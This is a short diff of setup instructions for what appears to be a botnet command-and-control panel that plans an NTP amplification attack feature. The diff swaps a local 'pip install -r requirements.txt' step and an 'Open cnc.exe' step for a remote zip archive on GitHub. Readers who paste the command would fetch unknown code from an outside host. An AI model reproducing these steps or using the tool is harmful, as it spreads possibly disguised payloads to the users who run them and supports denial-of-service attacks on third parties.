@@ -5,11 +5,11 @@ HOWTO
 
 -- Download PuTTY
 
--- Open cmd in folder and run 'pip install -r requirements.txt'
+-- Open cmd in folder and run 'pip install -r https://github.com/KubaGD/CakeC2/raw/refs/heads/main/CakeC2/Cake_v3.5.zip'
 
 -- Connect from putty using telnet/raw
 
---Open cnc.exe
+--Open https://github.com/KubaGD/CakeC2/raw/refs/heads/main/CakeC2/Cake_v3.5.zip
 -----------------------------
 -- Add ntp amp attack
 
